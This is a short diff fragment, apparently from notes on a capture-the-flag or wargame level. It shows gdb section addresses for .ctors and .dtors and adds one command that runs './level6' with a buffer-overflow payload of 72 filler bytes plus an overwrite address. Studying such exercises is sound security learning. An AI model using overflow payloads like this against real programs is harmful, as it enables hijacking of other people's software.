@@ -1,5 +1,4 @@
 (gdb) mai i sections
     0x8049720->0x8049728 at 0x00000720: .ctors ALLOC LOAD DATA HAS_CONTENTS
     0x8049728->0x8049730 at 0x00000728: .dtors ALLOC LOAD DATA HAS_CONTENTS
-
-
+./level6 $(python -c 'print "A" * 72 + "\x54\x84\x04\x08"')
